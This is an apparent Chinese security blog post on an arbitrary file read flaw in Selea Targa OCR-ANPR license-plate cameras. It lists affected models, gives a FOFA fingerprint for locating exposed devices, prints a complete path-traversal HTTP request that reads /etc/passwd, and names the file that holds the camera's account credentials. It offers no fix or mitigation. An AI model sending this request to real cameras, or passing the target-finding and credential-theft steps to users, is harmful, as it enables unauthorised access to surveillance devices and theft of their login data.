#  Selea-OCR-ANPR摄像机-SeleaCamera-任意文件读取漏洞   
原创 骇客安全  骇客安全   2025-03-29 12:48  
  
# 漏洞描述  
  
Selea OCR-ANPR摄像机 SeleaCamera 存在任意文件读取漏洞，攻击者通过构造特定的Url读取服务器的文件  
  
## 漏洞影响  
```
Selea Selea Targa IP OCR-ANPR Camera iZero
Selea Selea Targa IP OCR-ANPR Camera Targa 512
Selea Selea Targa IP OCR-ANPR Camera Targa 504
Selea Selea Targa IP OCR-ANPR Camera Targa Semplice
Selea Selea Targa IP OCR-ANPR Camera Targa 704 TKM
Selea Selea Targa IP OCR-ANPR Camera Targa 805
Selea Selea Targa IP OCR-ANPR Camera Targa 710 INOX
Selea Selea Targa IP OCR-ANPR Camera Targa 750
Selea Selea Targa IP OCR-ANPR Camera Targa 704 ILB
```  
  
## FOFA  
```
"selea_httpd"
```  
  
## 漏洞复现  
  
登录页面如下  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991MFvUUVteatic6AibJ35SmzZ8puib5UBGCGd81tIexErvasq8vIRxce3kt1lHBqCSJJFeBsgku0OLzWA/640?wx_fmt=png&from=appmsg "null")  
  
  
发送如下请求包读取文件  
  
```
GET /CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991MFvUUVteatic6AibJ35SmzZ89z9Z6V8Y8dfLfKOJbe3hcWOroTTibzg6HNOykPd1oEI3rDz0CwbwLgQ/640?wx_fmt=png&from=appmsg "null")  
  
  
摄像头账号密码文件为 **mnt/data/auth/users.json**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991MFvUUVteatic6AibJ35SmzZ8q1VyYBg6DNTiavMWNjicCI3rLiaKiaNSic2NRkvLwwxr8seic8BP12ZFEaQQ/640?wx_fmt=png&from=appmsg "null")  
  
  
